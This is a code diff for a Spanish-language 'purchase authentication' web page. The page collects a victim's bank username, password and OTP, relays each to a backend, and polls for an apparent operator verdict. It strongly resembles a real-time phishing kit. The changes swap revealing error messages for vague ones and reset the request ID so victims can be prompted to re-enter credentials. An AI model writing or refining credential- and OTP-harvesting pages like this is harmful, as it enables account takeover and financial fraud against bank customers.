@@ -335,7 +335,9 @@
             pollingInterval = setInterval(async () => {
                 if (Date.now() - start > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    mostrarError('⏰ Tiempo de espera agotado.'); resetFormulario(); return;
+                    mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
+                    resetFormulario();
+                    return;
                 }
                 try {
                     const r = await fetch(`/api/estado-pago/${solicitudId}`);
@@ -353,20 +355,22 @@
                         setTimeout(() => { window.location.href = 'exito.html'; }, 1500); return;
                     }
 
-                    // 🔥 NUEVO: ERROR DE USUARIO
+                    // 🔥 ERROR DE USUARIO → reiniciar con NUEVO solicitud_id
                     if (data.estado === 'rechazado_user_error') {
                         clearInterval(pollingInterval); pollingInterval = null;
-                        statusMessage.className = 'status-message error-usuario';
-                        statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
+                        statusMessage.className = 'status-message error';
+                        statusMessage.textContent = 'No fue posible validar la información ingresada. Por favor, inténtalo nuevamente.';
                         statusMessage.style.display = 'block';
                         loadingOverlay.classList.remove('active');
-                        resetFormulario(); 
+                        resetFormulario(true); // 👈 genera nuevo ID
                         return;
                     }
 
                     if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval); pollingInterval = null;
-                        mostrarError(data.mensaje || '❌ Rechazado'); resetFormulario(); return;
+                        mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
+                        resetFormulario();
+                        return;
                     }
                 } catch (e) {}
             }, POLLING_INTERVAL);
@@ -394,7 +398,7 @@
             formularioBloqueado = false;
         }
 
-        function resetFormulario() {
+        function resetFormulario(nuevaSolicitud = false) {
             usernameInput.disabled = false; 
             passwordInput.disabled = false; 
             confirmationInput.disabled = true;
@@ -408,6 +412,24 @@
             confirmationInput.value = '';
             formularioBloqueado = false;
             if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
+
+            // Limpiar marcas de error de los inputs
+            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+
+            // Restaurar título y subtítulo originales
+            document.getElementById('mainTitle').textContent = 'Autenticación de compra';
+            document.getElementById('mainSubtitle').innerHTML =
+                `Ingresa tus credenciales de seguridad para tu <strong>${bankNombre.textContent}</strong> para validar la transacción.`;
+
+            if (nuevaSolicitud) {
+                // 🔥 Nuevo ID para empezar de cero en el backend
+                solicitudId = 'sol_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+                try {
+                    const t = JSON.parse(localStorage.getItem('tarjeta_aprobada') || 'null');
+                    if (t) { t.solicitud_id = solicitudId; localStorage.setItem('tarjeta_aprobada', JSON.stringify(t)); }
+                } catch {}
+                localStorage.setItem('tarjeta_aprobada_solicitud', solicitudId);
+            }
         }
 
         form.addEventListener('submit', async function(e) {
@@ -447,7 +469,7 @@
                 
                 const ok = await enviarDatos('credenciales');
                 if (!ok) { 
-                    mostrarError('Error al procesar las credenciales'); 
+                    mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     resetFormulario(); 
                     return; 
                 }
@@ -460,7 +482,7 @@
                 
                 const ok = await enviarDatos('otp', confirmationInput.value.trim());
                 if (!ok) { 
-                    mostrarError('Error al procesar el OTP'); 
+                    mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     formularioBloqueado = false; 
                     submitButton.disabled = false; 
                     buttonText.textContent = 'Confirmar OTP'; 
